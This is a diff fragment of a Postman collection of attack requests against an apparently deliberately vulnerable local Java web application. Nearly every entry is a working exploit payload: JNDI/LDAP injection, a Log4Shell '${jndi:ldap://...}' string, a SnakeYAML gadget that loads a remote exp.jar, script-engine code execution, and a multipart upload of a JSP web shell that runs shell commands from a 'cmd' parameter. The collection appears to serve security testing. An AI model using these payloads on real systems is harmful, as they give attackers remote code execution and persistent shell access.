+								"url": "http://localhost:8000/JNDI/header/lookup.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"root\": {\"url\":\"ldap://127.0.0.1:8888/test\"}}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/JNDI/json/lookup.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "url",
+											"value": "ldap://127.0.0.1:8888/test",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/JNDI/post/lookup.do"
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "22. 禁止的类方法",
+			"item": [
+				{
+					"name": "Log4j",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"root\": {\"userId\": \"${jndi:ldap://127.0.0.1:8888}\"}}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/DisableMethod/log4j.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "23. Yaml反序列化",
+			"item": [
+				{
+					"name": "Yaml",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"xml\": \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:8888/exp.jar']]]]\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Yaml/yaml.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "24. ScriptEngine",
+			"item": [
+				{
+					"name": "脚本语⾔解析",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "exp",
+									"value": "function test(){ return java.util.Arrays.toString(new\njava.io.File('/usr').list())};test();",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/ScriptEngine/scriptEngineEval.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "00. 请求代理",
+			"item": [
+				{
+					"name": "RequestProxy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"req\":\"POST /FileUpload/upload.do HTTP/1.1\\nHost: 10.10.99.2:8000\\nContent-Length: 539\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: null\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\nConnection: close\\n\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"username\\\"\\n\\nadmin\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\\\"\\nContent-Type: application/octet-stream\\n\\n<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream())%>\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"submit\\\"\\n\\nSubmit\\n------WebKitFormBoundaryWqGd83IIbg2U327I--\\n\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Request/proxy.do"
+					},
+					"response": []
+				}
+			]
+		}
+	]
+}
